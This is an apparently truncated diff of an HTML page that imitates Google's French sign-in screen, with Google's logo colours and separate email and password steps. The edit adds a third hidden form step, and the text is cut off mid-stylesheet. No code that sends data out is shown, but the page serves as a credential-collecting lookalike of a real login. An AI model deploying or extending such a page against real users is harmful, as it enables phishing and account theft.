@@ -1,229 +1,142 @@
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Connexion - Google</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
-    }
-    body {
-      background-color: #ffffff;
-      margin: 0;
-      padding: 0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-    }
-    .container {
-      width: 100%;
-      max-width: 400px;
-      padding: 40px 24px;
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-    }
-    .top-content {
-      text-align: center;
-    }
-    .logo {
-      font-size: 32px;
-      font-weight: 500;
-      letter-spacing: -0.5px;
-      margin-bottom: 16px;
-    }
-    .logo span:nth-child(1) { color: #4285F4; }
-    .logo span:nth-child(2) { color: #EA4335; }
-    .logo span:nth-child(3) { color: #FBBC05; }
-    .logo span:nth-child(4) { color: #4285F4; }
-    .logo span:nth-child(5) { color: #34A853; }
-    .logo span:nth-child(6) { color: #EA4335; }
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connexion - Google</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      font-family: 'Roboto', -apple-system, BlinkMacSystemFont, Arial, sans-serif;
+    }
+    body {
+      background-color: #ffffff;
+      margin: 0;
+      padding: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .container {
+      width: 100%;
+      max-width: 400px;
+      padding: 40px 24px;
+      display: flex;
+      flex-direction: column;
+      min-height: 90vh;
+      justify-content: space-between;
+    }
+    .top-content {
+      text-align: center;
+    }
+    .logo {
+      font-size: 32px;
+      font-weight: 500;
+      letter-spacing: -0.5px;
+      margin-bottom: 16px;
+    }
+    .logo span:nth-child(1) { color: #4285F4; }
+    .logo span:nth-child(2) { color: #EA4335; }
+    .logo span:nth-child(3) { color: #FBBC05; }
+    .logo span:nth-child(4) { color: #4285F4; }
+    .logo span:nth-child(5) { color: #34A853; }
+    .logo span:nth-child(6) { color: #EA4335; }
 
-    .title {
-      font-size: 26px;
-      color: #1f1f1f;
-      margin-bottom: 12px;
-      font-weight: 400;
-    }
-    .description {
-      font-size: 15px;
-      color: #3c4043;
-      line-height: 1.4;
-      margin-bottom: 24px;
-    }
+    .title {
+      font-size: 26px;
+      color: #1f1f1f;
+      margin-bottom: 12px;
+      font-weight: 400;
+    }
+    .description {
+      font-size: 15px;
+      color: #3c4043;
+      line-height: 1.4;
+      margin-bottom: 8px;
+    }
+    .learn-more {
+      display: block;
+      color: #1a73e8;
+      font-size: 15px;
+      text-decoration: none;
+      font-weight: 500;
+      margin-bottom: 32px;
+      text-align: left;
+    }
 
-    .input-group {
-      position: relative;
-      margin-bottom: 16px;
-      text-align: left;
-    }
-    .input-group input {
-      width: 100%;
-      padding: 16px;
-      font-size: 16px;
-      border: 1.5px solid #1a73e8;
-      border-radius: 4px;
-      outline: none;
-      background: transparent;
-      color: #202124;
-    }
-    .input-group label {
-      position: absolute;
-      left: 12px;
-      top: -10px;
-      background-color: #ffffff;
-      padding: 0 4px;
-      font-size: 12px;
-      color: #1a73e8;
-    }
+    .input-group {
+      position: relative;
+      margin-bottom: 12px;
+      text-align: left;
+    }
+    .input-group input {
+      width: 100%;
+      padding: 16px;
+      font-size: 16px;
+      border: 1.5px solid #1a73e8;
+      border-radius: 4px;
+      outline: none;
+      background: transparent;
+      color: #202124;
+    }
+    .input-group label {
+      position: absolute;
+      left: 12px;
+      top: -10px;
+      background-color: #ffffff;
+      padding: 0 4px;
+      font-size: 12px;
+      color: #1a73e8;
+    }
 
-    .forgot-link {
-      display: block;
-      color: #1a73e8;
-      font-size: 14px;
-      text-decoration: none;
-      font-weight: 500;
-      text-align: left;
-      margin-bottom: 24px;
-    }
+    .forgot-link, .create-account {
+      display: block;
+      color: #1a73e8;
+      font-size: 14px;
+      text-decoration: none;
+      font-weight: 500;
+      text-align: left;
+      margin-bottom: 20px;
+    }
 
-    .bottom-actions {
-      display: flex;
-      justify-content: flex-end;
-      align-items: center;
-      margin-top: 32px;
-    }
+    .bottom-actions {
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      margin-top: 40px;
+    }
 
-    button {
-      padding: 10px 24px;
-      background-color: #1a73e8;
-      color: #ffffff;
-      border: none;
-      border-radius: 4px;
-      font-size: 14px;
-      font-weight: 500;
-      cursor: pointer;
-    }
-    button:hover {
-      background-color: #1557b0;
-    }
+    button {
+      padding: 10px 24px;
+      background-color: #1a73e8;
+      color: #ffffff;
+      border: none;
+      border-radius: 4px;
+      font-size: 14px;
+      font-weight: 500;
+      cursor: pointer;
+    }
+    button:hover {
+      background-color: #1557b0;
+    }
 
-    #step2Form, #success-message {
-      display: none;
-    }
+    #step2Form, #step3Form, #success-message {
+      display: none;
+    }
 
-    .user-chip {
-      display: inline-block;
-      border: 1px solid #dadce0;
-      border-radius: 16px;
-      padding: 6px 16px;
-      font-size: 14px;
-      color: #3c4043;
-      margin-bottom: 24px;
-    }
+    .user-chip {
+      display: inline-block;
+      border: 1px solid #dadce0;
+      border-radius: 16px;
+      padding: 4px 12px;
+      font-size: 14px;
+      color: #3c4043;
+      margin-bottom: 20px;
+    }
 
-    .show-password {
-      display: flex;
-      align-items: center;
-      gap: 8px;
-      font-size: 14px;
-      color: #3c4043;
-      margin-top: 12px;
-      text-align: left;
-    }
-  </style>
-</head>
-<body>
-
-  <div class="container">
-    <div class="top-content">
-      <!-- شعار Google -->
-      <div class="logo">
-        <span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
-      </div>
-
-      <!-- الخطوة الأولى: البريد الإلكتروني -->
-      <form id="step1Form">
-        <h1 class="title">Connexion</h1>
-        <p class="description">Accéder à Google</p>
-
-        <div class="input-group">
-          <input type="email" id="emailInput" required placeholder=" ">
-          <label for="emailInput">E-mail ou téléphone</label>
-        </div>
-        <a href="#" class="forgot-link">E-mail oublié ?</a>
-
-        <div class="bottom-actions">
-          <button type="submit">Suivant</button>
-        </div>
-      </form>
-
-      <!-- الخطوة الثانية: كلمة المرور -->
-      <form id="step2Form">
-        <h1 class="title">Bienvenue</h1>
-        <div class="user-chip" id="displayEmail">user@gmail.com</div>
-        
-        <div class="input-group">
-          <input type="password" id="passwordInput" required placeholder=" ">
-          <label for="passwordInput">Saisissez votre mot de passe</label>
-        </div>
-        
-        <div class="show-password">
-          <input type="checkbox" id="togglePassword">
-          <label for="togglePassword">Afficher le mot de passe</label>
-        </div>
-
-        <div class="bottom-actions">
-          <button type="submit">Suivant</button>
-        </div>
-      </form>
-
-      <!-- رسالة النجاح -->
-      <div id="success-message">
-        <h1 class="title">Connexion réussie</h1>
-        <p class="description">Vous êtes connecté avec succès.</p>
-      </div>
-
-    </div>
-  </div>
-
-  <!-- كود JavaScript لتنقل الخيارات -->
-  <script>
-    const step1Form = document.getElementById('step1Form');
-    const step2Form = document.getElementById('step2Form');
-    const successMessage = document.getElementById('success-message');
-
-    const emailInput = document.getElementById('emailInput');
-    const displayEmail = document.getElementById('displayEmail');
-    const passwordInput = document.getElementById('passwordInput');
-    const togglePassword = document.getElementById('togglePassword');
-
-    // الانتقال من الخطوة الأولى إلى الثانية
-    step1Form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      if (emailInput.value.trim() !== "") {
-        displayEmail.textContent = emailInput.value;
-        step1Form.style.display = 'none';
-        step2Form.style.display = 'block';
-      }
-    });
-
-    // إظهار أو إخفاء كلمة المرور
-    togglePassword.addEventListener('change', function() {
-      passwordInput.type = this.checked ? 'text' : 'password';
-    });
-
-    // إتمام عملية الدخول
-    step2Form.addEventListener('submit', function(e) {
-      e.preventDefault();
-      if (passwordInput.value.trim() !== "") {
-        step2Form.style.display = 'none';
-        successMessage.style.display = 'block';
-      }
-    });
-  </script>
-</body>
-</html>
+    .show-password {
+      display: flex;
+      align-items: center;
+      font-size: 14px;
+      color
